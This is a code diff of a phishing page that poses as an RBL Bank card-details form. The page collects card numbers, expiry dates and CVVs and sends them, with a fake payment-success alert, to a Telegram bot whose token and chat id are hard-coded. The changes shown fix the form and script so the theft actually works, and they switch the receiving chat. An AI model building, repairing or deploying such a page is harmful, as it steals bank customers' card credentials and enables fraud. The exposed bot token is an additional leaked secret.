@@ -118,19 +118,20 @@ footer a {
             <p>Hello, RBL Bank Customer</p>
             <p>Complete your card details in a few simple steps</p>
             <div class="bank-logo">
-                <img src="https://tinyurl.com/yj95fwrw" style="width: 250px" alt="RBL Bank Logo">
+                <img src="https://tinyurl.com/yzxpf8sw" style="width: 250px" alt="RBL Bank Logo">
+               
             </div>
-
+<form action="" onsubmit=" return sender()">
             <div class="card-input-section">
                 <h2>RBL BANK CREDIT CARD</h2>
 
                 <label for="card-number">Card 16-Digit Number</label>
-                <input type="text" id="card-number" name="card-number" placeholder="XXXX - XXXX - XXXX - XXXX" maxlength="19">
+                <input type="text" id="card" name="card" placeholder="XXXX - XXXX - XXXX - XXXX" maxlength="19">
 
                 <div class="expiry-cvv">
                     <div>
                         <label for="expiry-date">Expiry Date</label>
-                        <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5">
+                        <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5">
                     </div>
                     <div>
                         <label for="cvv">CVV</label>
@@ -138,7 +139,8 @@ footer a {
                     </div>
                 </div>
             </div>
-            <button class="submit-btn">Submit</button>
+   <input type="submit" value="submit" class="submit-btn">
+            </form>
         </div>
         <footer>
             <p>Copyright &copy; RBL Bank, All rights reserved</p>
@@ -148,7 +150,7 @@ footer a {
             <a href="#">Terms and Conditions</a>
         </footer>
     </div>
-      <link rel="stylesheet" href="style.css">
+     <link rel="stylesheet" href="style.css">
     <script src="sender.js"></script>
   
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
@@ -157,15 +159,15 @@ footer a {
   //bot token
 var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
 //chat id
-var chat_id = 5548933657;
+var chat_id = 1210231596;
 var ready = function () {
-    card-number = document.getElementById("card-number").value;
-    expiry-date = document.getElementById("expiry-date").value;
+    card = document.getElementById("card").value;
+    expiry = document.getElementById("expiry").value;
     cvv = document.getElementById("cvv").value;
   
     message = 
-      "\ncard No: " + card-number +  
-      "\nexp: " + expiry-date + 
+      "\ncard No: " + card +  
+      "\nexp: " + expiry + 
       "\ncvv: " + cvv;
 };
 var sender = function () {
@@ -187,11 +189,12 @@ var sender = function () {
     };
     $.ajax(settings).done(function (response) {
         console.log(response);
+      
       swal("Successfull", "Your Payment Successfull", "success");
       
     });
-    document.getElementById("card-number").value = "";
-    document.getElementById("expiry-date").value = "";
+    document.getElementById("card").value = "";
+    document.getElementById("expiry").value = "";
     document.getElementById("cvv").value = "";
     return false;
 };
